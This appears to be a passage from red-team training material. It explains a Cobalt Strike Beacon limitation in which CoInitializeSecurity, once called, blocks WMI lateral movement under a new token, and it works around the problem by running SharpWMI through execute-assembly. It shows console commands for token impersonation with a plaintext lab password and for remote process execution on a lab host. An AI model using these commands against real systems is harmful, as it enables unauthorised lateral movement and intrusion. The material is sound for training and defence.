Beacon's internal implementation of WMI uses a [Beacon Object File](https://cobaltstrike.com/help-beacon-object-files), executed using the [beacon_inline___execute](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_inline_execute) Aggressor function. When a BOF is executed the [CoInitializeSecurity](https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity) COM object can be called, which is used to set the security context for the current process. According to Microsoft's documentation, this can only be called once per process.

The unfortunate consequence is that if you have CoInitializeSecurity get called in the context of, say "User A", then future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process.

An example of that can look like the following:
```shell
beacon> make_token DEV\jking Purpl3Drag0n
[+] Impersonated DEV\bfarmer

beacon> remote-exec wmi srv-2 calc
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to srv-2: 5
```

We know `jking` is a local admin on SRV-2 but because `CoInitializeSecurity` has already been called (probably in the context of `bfarmer`), WMI fails with access denied.

As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as `spawn` and `spawnas`, or even `execute-assembly` with a tool such as `SharpWMI`.
```shell
beacon> remote-exec wmi srv-2 calc
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to srv-2: 5

beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Debug\SharpWMI.exe action=exec computername=srv-2 command="C:\Windows\System32\calc.exe"

[*] Host                           : srv-2
[*] Command                        : C:\Windows\System32\calc.exe
[*] Creation of process returned   : 0
[*] Process ID                     : 1312
```
